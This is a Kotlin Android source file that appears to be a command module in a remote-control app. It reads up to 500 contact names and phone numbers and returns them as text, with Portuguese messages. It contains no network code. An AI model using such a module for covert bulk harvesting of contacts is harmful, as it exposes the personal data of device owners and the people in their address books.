package com.serv.app.cmds

import android.Manifest
import android.content.Context
import android.provider.ContactsContract
import com.serv.app.core.Perms

object ContactsCmd {
    fun run(ctx: Context): String {
        if (!Perms.has(ctx, Manifest.permission.READ_CONTACTS)) return "Permissão faltando: READ_CONTACTS"
        return try {
            val sb = StringBuilder()
            ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < 500) {
                    val name = c.getString(0) ?: "?"
                    val num = c.getString(1) ?: "?"
                    sb.append("$name | $num\n")
                    n++
                }
            }
            if (sb.isEmpty()) "Sem contatos." else sb.toString()
        } catch (t: Throwable) { "ERRO: ${t.message}" }
    }
}
